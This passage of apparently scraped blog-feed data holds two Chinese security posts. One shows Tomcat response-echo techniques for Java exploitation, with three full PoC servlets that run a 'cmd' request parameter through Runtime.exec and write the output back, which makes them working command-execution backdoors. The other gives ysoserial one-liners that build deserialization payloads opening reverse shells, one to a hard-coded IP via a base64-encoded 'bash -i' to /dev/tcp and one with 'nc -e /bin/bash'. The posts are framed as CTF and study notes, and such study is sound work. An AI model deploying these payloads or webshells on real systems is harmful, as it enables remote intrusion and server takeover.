lastServicedResponseField.get(null); //获取lastServicedResponse变量\nServletResponse responseFacade = lastServicedResponse.get(); //获取lastServicedResponse中存储的变量\n\n\n修复输出报错\n\n可以在调用getWriter函数之后，通过反射修改usingWriter变量值。\nField responseField = ResponseFacade.class.getDeclaredField(\"response\");//获取response字段\nresponseField.setAccessible(true);//将变量设置为可访问\nResponse response = (Response) responseField.get(responseFacade);//获取变量\nField usingWriter = Response.class.getDeclaredField(\"usingWriter\");//获取usingWriter字段\nusingWriter.setAccessible(true);//将变量设置为可访问\nusingWriter.set((Object) response, Boolean.FALSE);//设置usingWriter为false\n\n\nPoC\n\npackage com.example.TomcatHalfEcho.Controller;  \n  \n  \nimport org.apache.catalina.connector.Response;  \nimport org.apache.catalina.connector.ResponseFacade;  \nimport org.apache.catalina.core.ApplicationFilterChain;  \nimport org.springframework.stereotype.Controller;  \nimport org.springframework.web.bind.annotation.RequestMapping;  \nimport org.springframework.web.bind.annotation.ResponseBody;  \n  \n  \nimport javax.servlet.ServletResponse;  \nimport java.io.IOException;  \nimport java.io.PrintWriter;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.Modifier;  \nimport java.nio.charset.StandardCharsets;  \nimport java.util.Scanner;  \n  \n  \n// Kingkk 师傅提出来的 Tomcat 半通用回显  \n@Controller  \npublic class EvilController &#123;  \n  \n    @RequestMapping(\"/index\")  \n    @ResponseBody  \n    public String IndexController(String cmd) throws IOException &#123;  \n        try &#123;  \n            // ApplicationDispatcher.WRAP_SAME_OBJECT变量修改为true  \n            Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");//获取WRAP_SAME_OBJECT字段  \n            Field modifiersField = Field.class.getDeclaredField(\"modifiers\");//获取modifiers字段  \n            modifiersField.setAccessible(true);//将变量设置为可访问  \n            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);//取消FINAL属性  \n            WRAP_SAME_OBJECT_FIELD.setAccessible(true);//将变量设置为可访问  \n            WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//将变量设置为true  \n  \n            // 用反射设置ApplicationDispathcer中的lastServicedResponse变量为修改访问  \n            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\");//获取lastServicedRequest变量  \n            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");//获取lastServicedResponse变量  \n            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);//取消FINAL属性  \n            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);//取消FINAL属性  \n            lastServicedRequestField.setAccessible(true);//将变量设置为可访问  \n            lastServicedResponseField.setAccessible(true);//将变量设置为可访问  \n  \n            ThreadLocal&lt;ServletResponse> lastServicedResponse = (ThreadLocal&lt;ServletResponse>) lastServicedResponseField.get(null); //获取lastServicedResponse变量  \n  \n            // 如果此时 lastServicedResponse 对象为null，则进行初始化为ThreadLocal对象  \n            if (lastServicedResponse == null) &#123;  \n                lastServicedRequestField.set(null, new ThreadLocal&lt;>());//设置ThreadLocal对象  \n                lastServicedResponseField.set(null, new ThreadLocal&lt;>());//设置ThreadLocal对象  \n            &#125; else if (cmd != null) &#123;  \n                // 否则则获取lastServicedResponse中的response对象，并执行命令将执行结果输入到response中  \n                ServletResponse responseFacade = lastServicedResponse.get();    //获取lastServicedResponse中存储的变量  \n  \n                String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();  \n  \n                // 方法一：使用 outputStream.write() 方法输出  \n                // responseFacade.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));  \n                // responseFacade.flushBuffer();  \n                // 方法二：使用 writer.writeA() 方法输出  \n                PrintWriter writer = responseFacade.getWriter();    // 获取writer对象  \n  \n                Field responseField = ResponseFacade.class.getDeclaredField(\"response\");//获取response字段  \n                responseField.setAccessible(true);//将变量设置为可访问  \n                Response response = (Response) responseField.get(responseFacade);//获取变量  \n                Field usingWriter = Response.class.getDeclaredField(\"usingWriter\");//获取usingWriter字段  \n                usingWriter.setAccessible(true);//将变量设置为可访问  \n                usingWriter.set((Object) response, Boolean.FALSE);//设置usingWriter为false  \n  \n                writer.write(res);  \n                writer.flush();  \n            &#125;  \n        &#125;catch (Exception e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n  \n        return \"test\";  \n  \n    &#125;  \n&#125;\n\n需要访问2次，第一次为设置ApplicationDispathcer.WRAP_SAME_OBJECT变量为true以及为lastServicedResponse对象进行初始化为ThreadLocal对象；第二次才是从lastServicedResponse对象中取出response对象进行操作。\n\n\n不足通过完整的学习这个回显方式，可以很明显的发现这个弊端，如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。\n其中Shiro RememberMe反序列化漏洞就遇到了这种情况，shiro的rememberMe功能，其实是shiro自己实现的一个filter。\n在org.apache.catalina.core.ApplicationFilterChain的internalDoFilter方法中\nif (pos &lt; n) &#123;\n    ApplicationFilterConfig filterConfig = filters[pos++];\n    try &#123;\n        Filter filter = filterConfig.getFilter();\n        ...\n         filter.doFilter(request, response, this);//Shiro漏洞触发点\n    &#125; catch (...)\n        ...\n    &#125;\n&#125;\ntry &#123;\n    if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;\n        lastServicedRequest.set(request);\n        lastServicedResponse.set(response);//Tomcat回显关键点\n    &#125;\n    if (...)&#123;\n        ...\n    &#125; else &#123;\n        servlet.service(request, response);//servlet调用点\n    &#125;\n&#125; catch (...) &#123;\n    ...\n&#125; finally &#123;\n    ...\n&#125;\n\n可以看到是先取出所有的的filter对当前请求进行拦截，通过之后，再进行cache request（即lastServicedResponse.set(response)方法），再从servlet.service(request, response) 进入servlet调用的逻辑代码。\nrememberMe功能就是ShiroFilter的一个模块，这样的话在这部分逻辑中执行的代码，还没进入到cache request的操作中，此时的cache内容就是空，从而也就获取不到我们想要的response。\n0x04 通过全局存储 Response回显上面通过ThreadLocal获取response的方式实际上是通过反射修改属性改变了Tomcat处理的部分流程，使得最终可以在ApplicationFilterChain类的lastServicedResponseField对象中去取到response对象。但是不足也说了，这种方式实际上依赖Tomcat本身的一些代码处理流程，在遇到注入点在流程之前就无法利用了。\n而现在这种方法是不再寻求改变代码流程，而是找找有没有Tomcat全局存储的request或response。\n分析寻找全局的Response我们之前在分析Servlet内存马的时候大致了解过Tomcat处理HTTP请求的时候流程入口在 org.apache.coyote.http11.Http11Processor 类中，该类继承了 AbstractProcessor。\n\n\n到AbstractProcessor类中看一下：\n\n\n可以看到Request以及Response就是AbstractProcessor的属性。而且这两个属性都是final类型的，也就是说其在赋值之后，对于对象的引用是不会改变的，那么我们只要能够获取到这个Http11Processor就肯定可以拿到Request和Response。\n但是这里的resquest和response并不是静态变量，无法直接从类里面去取出来，需要从对象里面取。这时候我们就需要去找存储Http11Processor或者Http11Processor request、response的变量。所以继续往上翻，在AbstractProtcol内部类ConnectionHandler的register方法中存在着对Http11Processor的操作\n\n\n跟进register方法中，可以看到rp为从Http11Processor对象中取到的RequestInfo对象，其中包含了request对象，然而request对象包含了response对象\n\n\n获取完RequestInfo对象后调用了rp.setGlobalProcessor(global)方法，跟进：\n\n\n可以看到这里把RequestInfo对象注册到了global中，这个global是AbstractProtcol内部类ConnectionHandler的一个属性\n\n\n因此如果获取到了global对象就可以取到里面的response对象了。现在的获取链变为了\nAbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\n但global对象还不是静态变量，因此我们还是需要找存储AbstractProtocol类或AbstractProtocol子类。\n在调用栈中存在CoyoteAdapter类，其中的connector对象protocolHandler属性为Http11NioProtocol，Http11NioProtocol的handler就是AbstractProtocol$ConnectoinHandler。\n\n\nconnector --> protocolHandler --> handler --> AbstractProtocol$ConnectoinHandler --> global-->RequestInfo --> req --> response\n\n如何获取connector对象就成为了问题所在，Tomcat启动过程中会创建connector对象，并通过addConnector方法存放在connectors中\n\n\n跟进addConnector方法，可以看到到了StandardService类里面\n\n\n从方法注释中可以看到，addConnector方法的操作为将传进来的connector对象放到StandardService对象的 connectors[] 数组中\n\n\n那么现在的获取链变成了\nStandardService --> connectors --> connector --> protocolHandler --> handler --> AbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\nconnectors同样为非静态属性，那么我们就需要获取在Tomcat中已经存在的StandardService对象，而不是新创建的对象。\n关键步骤如何获取\n如何获取当前的StandardService对象呢？这时候回顾Tomcat的架构\n\n\n发现Service已经是最外层的对象了，再往外就涉及到了Tomcat类加载机制。Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况。\n\n假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。\n\nTomcat加载机制简单讲，WebAppClassLoader负责加载本身的目录下的class文件，加载不到时再交给CommonClassLoader加载，这和双亲委派刚好相反。\n在SpringBoot项目中调试看下Thread.currentThread().getContextClassLoader() 中的内容\n\n\nWebappClassLoader里面确实包含了很多很多关于tomcat相关的变量，其中service变量就是要找的StandardService对象。那么至此整个调用链就有了入口点\nWebappClassLoader --> resources --> context --> context --> StandardService --> connectors --> connector --> protocolHandler --> handler --> AbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\n因为这个调用链中一些变量有 get 方法因此可以通过 get 函数很方便的执行调用链，对于那些私有保护属性的变量我们只能采用反射的方式动态的获取。\n实现\n获取Tomcat ClassLoader context\n\n这里针对不同的Tomcat版本获取的方式不同，Tomcat 8或9的低版本（这里我用的是8.5.21）可以直接从webappClassLoaderBase.getResources().getContext() 获取：\norg.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\nStandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();\n\n\n\n但是在高版本的话 webappClassLoaderBase.getResources() 返回的是null，无法获取（解决方案看后文）\n\n获取standardContext的context\n\n因为context不是final变量，因此可以省去一些反射修改操作\nField context = Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredField(\"context\");context.setAccessible(true);//将变量设置为可访问\norg.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);\n\n\n获取ApplicationContext的service\n\nField service = Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredField(\"service\");service.setAccessible(true); //将变量设置为可访问\nStandardService standardService = (StandardService)service.get(ApplicationContext);\n\n\n获取StandardService的connectors\n\nField connectorsField = Class.forName(\"org.apache.catalina.core.StandardService\").getDeclaredField(\"connectors\");\nconnectorsField.setAccessible(true); //将变量设置为可访问\norg.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);\n\n\n获取AbstractProtocol的handler\n\n获取到connectors之后，可以通过函数发现getProtocolHandler为public，因此我们可以通直接调用该方法的方式获取到对应的handler。\norg.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();\nField handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\nhandlerField.setAccessible(true);\norg.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);\n\n\n获取内部类ConnectionHandler的global\n\n通过org.apache.coyote.AbstractProtocol$ConnectionHandler的命名方式，直接使用反射获取该内部类对应字段。\nField globalField = Class.forName(\"org.apache.coyote.AbstractProtocol$ConnectionHandler\").getDeclaredField(\"global\");\nglobalField.setAccessible(true);\nRequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);\n\n\n获取RequestGroupInfo的processors\n\nprocessors为List数组，其中存放的是RequestInfo\nField processors = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");processors.setAccessible(true);java.util.List&lt;RequestInfo> RequestInfolist = (java.util.List&lt;RequestInfo>) processors.get(global);\n\n\n获取Response，并做输出处理\n\n遍历获取RequestInfolist中的所有requestInfo，使用反射获取每个requestInfo中的req变量，从而获取对应的response。后续就和之前一样可以通过Response.getOutputStream().write()输出；或者在getWriter后将usingWriter置为false，并调用flush进行输出。\nField reqField = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");\nreqField.setAccessible(true);\nfor (RequestInfo requestInfo : RequestInfolist) &#123;//遍历\n    org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request )reqField.get(requestInfo);//获取request\n    org.apache.catalina.connector.Request connectorRequest = ( org.apache.catalina.connector.Request)coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request\n    org.apache.catalina.connector.Response connectorResponse = connectorRequest.getResponse();\n    \n    // 从connectorRequest 中获取参数并执行\n    String cmd = connectorRequest.getParameter(\"cmd\");\n    String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n    \n    // 方法一\n    // connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));\n    // connectorResponse.flushBuffer();\n    \n    // 方法二\n    java.io.Writer w = response.getWriter();//获取Writer\n    Field responseField = ResponseFacade.class.getDeclaredField(\"response\");\n    responseField.setAccessible(true);\n    Field usingWriter = Response.class.getDeclaredField(\"usingWriter\");\n    usingWriter.setAccessible(true);\n    usingWriter.set(connectorResponse, Boolean.FALSE);//初始化\n    w.write(res);\n    w.flush();//刷新\n&#125;\n\n\nPoC\n\npackage com.example.TomcatHalfEcho.Controller;  \n  \nimport org.apache.catalina.connector.Response;  \nimport org.apache.catalina.connector.ResponseFacade;  \nimport org.apache.catalina.core.StandardContext;  \nimport org.apache.catalina.core.StandardService;  \nimport org.apache.coyote.RequestGroupInfo;  \nimport org.apache.coyote.RequestInfo;  \nimport org.apache.tomcat.util.net.AbstractEndpoint;  \n  \n  \nimport javax.servlet.*;  \nimport javax.servlet.annotation.WebServlet;  \nimport javax.servlet.http.HttpServlet;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.IOException;  \nimport java.lang.reflect.Field;  \n  \n  \n// 适用于 Tomcat8，获取全局 response 进行攻击  \n  \n@WebServlet(urlPatterns = \"/servletAttack\")  \npublic class GlobalContextAttack extends HttpServlet &#123;  \n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n  \n        try &#123;  \n            // 获取Tomcat ClassLoader context  \n            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  \n            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();  \n  \n            // 获取standardContext的context  \n            Field context = Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredField(\"context\");  \n            context.setAccessible(true);//将变量设置为可访问  \n            org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext) context.get(standardContext);  \n  \n            // 获取ApplicationContext的service  \n            Field service = Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredField(\"service\");  \n            service.setAccessible(true);//将变量设置为可访问  \n            StandardService standardService = (StandardService) service.get(ApplicationContext);  \n  \n            // 获取StandardService的connectors  \n            Field connectorsField = Class.forName(\"org.apache.catalina.core.StandardService\").getDeclaredField(\"connectors\");  \n            connectorsField.setAccessible(true);//将变量设置为可访问  \n            org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[]) connectorsField.get(standardService);  \n  \n            // 获取AbstractProtocol的handler  \n            org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();  \n            Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");  \n            handlerField.setAccessible(true);  \n            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);  \n  \n            // 获取内部类ConnectionHandler的global  \n            Field globalField = Class.forName(\"org.apache.coyote.AbstractProtocol$ConnectionHandler\").getDeclaredField(\"global\");  \n            globalField.setAccessible(true);  \n            RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);  \n  \n            // 获取RequestGroupInfo的processors  \n            Field processors = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");  \n            processors.setAccessible(true);  \n            java.util.List&lt;RequestInfo> RequestInfolist = (java.util.List&lt;RequestInfo>) processors.get(global);  \n  \n            // 获取Response，并做输出处理  \n            Field reqField = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");  \n            reqField.setAccessible(true);  \n            for (RequestInfo requestInfo : RequestInfolist) &#123;//遍历  \n                org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request )reqField.get(requestInfo);//获取request  \n                org.apache.catalina.connector.Request connectorRequest = ( org.apache.catalina.connector.Request)coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request  \n                org.apache.catalina.connector.Response connectorResponse = connectorRequest.getResponse();  \n                java.io.Writer w = response.getWriter();//获取Writer  \n                Field responseField = ResponseFacade.class.getDeclaredField(\"response\");  \n                responseField.setAccessible(true);  \n                Field usingWriter = Response.class.getDeclaredField(\"usingWriter\");  \n                usingWriter.setAccessible(true);  \n                usingWriter.set(connectorResponse, Boolean.FALSE);//初始化  \n                w.write(\"1111\");  \n                w.flush();//刷新  \n            &#125;  \n  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n  \n    &#125;  \n  \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n        this.doPost(request, response);  \n    &#125;  \n&#125;\n\nTomcat版本问题刚才在一开始获取Tomcat ClassLoader context提到这种方式只适用于Tomcat 8和9的低版本中，那么有没有一种能通杀所有版本的方法呢？\n回顾整条调用链：\nWebappClassLoader --> resources --> context --> context --> StandardService --> connectors --> connector --> protocolHandler --> handler --> AbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\n我们重新来思考一下我们从 Thread.currentThread().getContextClassLoader() 中获取 StandardContext到StandardService 再到获取 Connector目的是什么， 其实目的就是为了获取 AbstractProtocolConnectoinHandler，因为 request 存在该对象的 global 属性中的 processors 中，那么我们其实接下来目的就是为了找到一个地方存储这 AbstractProtocolConnectoinHandler。\n发现在 org.apache.tomcat.util.net.AbstractEndpoint 的 handler 是 AbstractEndpointHandler 定义的，同时 Handler 的实现类是 AbstractProtocolConnectoinHandler。\n因为 AbstractEndpoint 是抽象类，且抽象类不能被实例化，需要被子类继承，所以我们去寻找其对应的子类，找到了对应的子类我们就能获取 handler 中的 AbstractProtocol$ConnectoinHandler 从而进一步获取 request 了\n\n\n\n\n这里我们来看到 NioEndpoint 类。NioEndpoint 是主要负责接受和处理 socket 的且其中实现了socket请求监听线程Acceptor、socket NIO poller线程、以及请求处理线程池。\n此时有一下两种方法从Thread.currentThread().getThreadGroup() 获取的线程中遍历找出我们需要的NioEndpoint 对象。\n通过Acceptor获取NioEndpoint遍历线程，获取线程中的target属性，如果该target是Acceptor类的话则其endpoint属性就是NioEndpoint 对象。\n\n\n利用链：\nThread.currentThread().getThreadGroup() --> theads[] --> thread --> target --> NioEndpoint$Poller --> NioEndpoint --> AbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\n通过poller获取NioEndpoint遍历线程，获取线程中的target属性，如果target属性是 NioEndpointPoller 类的话，通过获取其父类 NioEndpoint，进而获取到 AbstractProtocolConnectoinHandler。\n\n\n利用链：\nThread.currentThread().getThreadGroup() --> theads[] --> thread --> target --> NioEndpoint$Poller --> NioEndpoint --> AbstractProtocol$ConnectoinHandler --> global --> RequestInfo --> req --> response\n\n实现上面两种方法都大同小异，以第一种为例。\n\n获取threads数组\n\nThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\nField threadsField =  ThreadGroup.class.getDeclaredField(\"threads\");\nthreadsField.setAccessible(true);\nThread[] threads = (Thread[])threadsField.get(threadGroup);\n\n\n遍历每一个thread获取其target属性\n\nfor(Thread thread:threads) &#123;\n   Field targetField = Thread.class.getDeclaredField(\"target\");\n   targetField.setAccessible(true);\n   Object target  = targetField.get(thread);\n\n\n找到Acceptor获取其endpoint属性\n\nif( target != null &amp;&amp; target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) &#123;\n    Field endpointField = Class.forName(\"org.apache.tomcat.util.net.Acceptor\").getDeclaredField(\"endpoint\");\n    endpointField.setAccessible(true);\n    Object endpoint = endpointField.get(target);\n\n这里如果是第二种方法就是找NioEndpoint$Poller对象，获取其this$0 属性\n\n获取AbstractEndpoint的handler属性\n\nField handlerField = Class.forName(\"org.apache.tomcat.util.net.AbstractEndpoint\").getDeclaredField(\"handler\");\nhandlerField.setAccessible(true);\nObject handler = handlerField.get(endpoint);\n\n此时的handler就是 AbstractProtocol$ConnectoinHandler 对象了，后续和之前一样\n\nPoC\n\npackage com.example.TomcatHalfEcho.Controller;  \n  \nimport org.apache.catalina.connector.Response;  \nimport org.apache.catalina.connector.ResponseFacade;  \nimport org.apache.coyote.RequestGroupInfo;  \nimport org.apache.coyote.RequestInfo;  \nimport org.apache.tomcat.util.net.AbstractEndpoint;  \n  \nimport javax.servlet.ServletException;  \nimport javax.servlet.annotation.WebServlet;  \nimport javax.servlet.http.HttpServlet;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.IOException;  \nimport java.lang.reflect.Field;  \n  \nimport java.util.Scanner;  \n  \n// 全 Tomcat 版本通用  \n  \n@WebServlet(\"/AllTomcat\")  \npublic class AllTomcatVersionAttack extends HttpServlet &#123;  \n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n  \n        try &#123;  \n            // 获取thread数组  \n            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();  \n            Field threadsField =  ThreadGroup.class.getDeclaredField(\"threads\");  \n            threadsField.setAccessible(true);  \n            Thread[] threads = (Thread[])threadsField.get(threadGroup);  \n  \n            for(Thread thread:threads) &#123;  \n                Field targetField = Thread.class.getDeclaredField(\"target\");  \n                targetField.setAccessible(true);  \n                Object target  = targetField.get(thread);  \n                if( target != null &amp;&amp; target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) &#123;  \n                    Field endpointField = Class.forName(\"org.apache.tomcat.util.net.Acceptor\").getDeclaredField(\"endpoint\");  \n                    endpointField.setAccessible(true);  \n                    Object endpoint = endpointField.get(target);  \n                    Field handlerField = Class.forName(\"org.apache.tomcat.util.net.AbstractEndpoint\").getDeclaredField(\"handler\");  \n                    handlerField.setAccessible(true);  \n                    Object handler = handlerField.get(endpoint);  \n  \n                    // 获取内部类ConnectionHandler的global  \n                    Field globalField = Class.forName(\"org.apache.coyote.AbstractProtocol$ConnectionHandler\").getDeclaredField(\"global\");  \n                    globalField.setAccessible(true);  \n                    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);  \n  \n                    // 获取RequestGroupInfo的processors  \n                    Field processors = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");  \n                    processors.setAccessible(true);  \n                    java.util.List&lt;RequestInfo> RequestInfolist = (java.util.List&lt;RequestInfo>) processors.get(global);  \n  \n  \n                    // 获取Response，并做输出处理  \n                    Field reqField = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");  \n                    reqField.setAccessible(true);  \n                    for (RequestInfo requestInfo : RequestInfolist) &#123;//遍历  \n                        org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request) reqField.get(requestInfo);//获取request  \n                        org.apache.catalina.connector.Request connectorRequest = (org.apache.catalina.connector.Request) coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request  \n                        org.apache.catalina.connector.Response connectorResponse = connectorRequest.getResponse();  \n  \n                        // 从connectorRequest 中获取参数并执行  \n                        String cmd = connectorRequest.getParameter(\"cmd\");  \n                        String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();  \n  \n                        // 方法一  \n//                connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));  \n//                connectorResponse.flushBuffer();  \n  \n                        // 方法二  \n                        java.io.Writer w = response.getWriter();//获取Writer  \n                        Field responseField = ResponseFacade.class.getDeclaredField(\"response\");  \n                        responseField.setAccessible(true);  \n                        Field usingWriter = Response.class.getDeclaredField(\"usingWriter\");  \n                        usingWriter.setAccessible(true);  \n                        usingWriter.set(connectorResponse, Boolean.FALSE);//初始化  \n                        w.write(res);  \n                        w.flush();//刷新  \n                    &#125;  \n                &#125;  \n            &#125;  \n  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n  \n    &#125;  \n  \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n        this.doPost(request, response);  \n    &#125;  \n&#125;\n\n\n\n不足利用链过长，会导致http包超长，可先修改 org.apache.coyote.http11.AbstractHttp11Protocol 的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制。还有就是操作复杂可能有性能问题，整体来讲该方法不受各种配置的影响，通用型较强。\n0x05 小结我个人的感觉是，这些回显技术在有成熟内存马技术之前相当有意义的，内存马和回显技术都是利用到了 Tomcat 的 reponse 的。\n0x06 Refhttps://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3\n","categories":["Java"],"tags":["Java"]},{"title":"Java 反弹 shell 与 Runtime.getRuntime().exec() 的故事","url":"/2022/10/12/Java-%E5%8F%8D%E5%BC%B9-shell-%E4%B8%8E-Runtime-getRuntime-exec-%E7%9A%84%E6%95%85%E4%BA%8B/","content":"Java 反弹 shell\n\nJava 反弹 shell 与 Runtime.getRuntime().exec() 的故事0x01 前言其实还有好多文章在🕊之中，但还是把懒癌赶走，决定先把这篇文章写完；这篇文章虽然是个踩坑合集里面的文章，但是也打算自己手动改一改 yso 的链子。\n\n说真的，太坑了。大部分还是因为我自己的原因\n\n一切的一切都是源于这道题目 ez_java_serialize - Bugku CTF，还有我自己的烂基础\n0x02 叙事论起初打这道题目，看了一位师傅的 WP，全网只有这位师傅有 WP，我这里先挂一下链接，这位师傅描述的内容大致上是没问题的，但是有几点因为描述不清楚，踩坑了。\nhttps://blog.csdn.net/qq_40646572/article/details/124128238\n构造 payload 都没啥问题，关键是在传参的时候，非常必要的一点是，要对加号 ———— + 进行 URL 编码\n0x03 关于 yso 的使用一般的命令是这样的：\njava -jar ysoxxx.jar 要打的链子 \"命令\" |base64 -w0\n\nbase64 是 base64 编码，-w0 是让它不要换行\n\n简单的两个弹 shell 语句\n\n这是 bash -i 的\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\" |base64 -w0\n\n这是 nc 的\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"nc xxx xx -e /bin/bash\" |base64 -w0\n\n最好在 Linux 下操作\n0x04 为什么自己写的 PoC 有时候收不到回显，尤其是弹 shell 的\n这其实是和 Runtime.getRuntime().exec() 的机制是有关系的\n\nRuntime.getRuntime().exec() 总共有六个重载方法\npublic Process exec(String command) throws IOException &#123;\n        return exec(command, null, null);\n&#125;\n\npublic Process exec(String command, String[] envp) throws IOException &#123;\n        return exec(command, envp, null);\n&#125;\n\npublic Process exec(String command, String[] envp, File dir)\n        throws IOException &#123;\n        if (command.length() == 0)\n            throw new IllegalArgumentException(\"Empty command\");\n\n        StringTokenizer st = new StringTokenizer(command);\n        String[] cmdarray = new String[st.countTokens()];\n        for (int i = 0; st.hasMoreTokens(); i++)\n            cmdarray[i] = st.nextToken();\n        return exec(cmdarray, envp, dir);\n&#125;\n\npublic Process exec(String cmdarray[]) throws IOException &#123;\n        return exec(cmdarray, null, null);\n&#125;\n\npublic Process exec(String[] cmdarray, String[] envp) throws IOException &#123;\n        return exec(cmdarray, envp, null);\n&#125;\n\npublic Process exec(String[] cmdarray, String[] envp, File dir)\n        throws IOException &#123;\n        return new ProcessBuilder(cmdarray)\n            .environment(envp)\n            .directory(dir)\n            .start();\n&#125;\n\n但不管哪个方法，最后都是调用执行 exec(String[] cmdarray, String[] envp, File dir)\n说了这么多，其实还没到点儿上，我们现在亟待解决的问题是 我们直接传入字符串不能直接进行命令执行，其实有下面几个原因\n照搬照抄的东西就不复制了，挂个链接，感兴趣的师傅可以看一下\nhttps://www.jianshu.com/p/ae3922db1f70\n如何让自己的 PoC 成功有效这里我觉得还是有必要说一下关于命令执行的几种方式\n最常用的应该是动态加载字节码了，在动态加载字节码里面，CC2，CC3，CC4，CB1 这几条链子是动态加载字节码的，后续要分析的 ROME 链子也是如此。这里我们就先要生成字节码，关于生成字节码的程序，用 javassist 确实是很不错，EXP 如下\n这个 EXP 是杰哥给我的，我滴杰哥总是话虽不多，但是都很命中要害。\npublic static byte[] getTemplatesImpl(String cmd) &#123;  \n    try &#123;  \n        ClassPool pool = ClassPool.getDefault();  \n        CtClass ctClass = 